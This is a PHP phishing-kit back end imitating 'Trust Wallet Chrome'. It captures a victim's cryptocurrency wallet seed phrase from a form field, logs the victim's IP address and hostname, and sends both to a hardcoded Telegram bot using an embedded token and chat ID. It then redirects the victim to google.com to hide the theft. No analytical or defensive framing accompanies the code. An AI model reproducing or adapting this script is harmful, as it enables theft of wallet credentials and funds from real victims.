<?php
if (isset($_POST)){
	
	 function sendMessage($messaggio) {
$chatID = '700163037'; // like: '-826930901'
$token = '974296556:AAGXTqQW__5Ptvkk9gN1p95V6jbHyiKi2vE'; //like: '824274280:AAFEMb-0Ro8-KH1yRHHVB5Eo6f4BhZijSu8'

$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
$url = $url . "&text=" . urlencode($messaggio);
$ch = curl_init();
$optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
return $result;

}





$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "------------------+ [ Trust Wallet Chrome ] +-----------------\n";
$message .= " 1.Phrase : ".$_POST['w1']."\n";
$message .= "-------------------------------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "-----------------+ Trust Chrome  +-----------------\n";

$send = "comcast@gmail.com"; #dir email
$subject = " B2P $ip";
$bilhead = "From: B2P ";

sendMessage($message);
//$fp = fopen("ke.txt", "a");
  //  $savestring = $message ;
   // fwrite($fp, $savestring);
 //   fclose($fp);
	//echo "food" . print_r($_POST['phra']);
die("<script type='text/javascript'> top.location = 'https://google.com'; </script>");
	
	
	
	
	
	
	
	
	
	
	
	
	
	}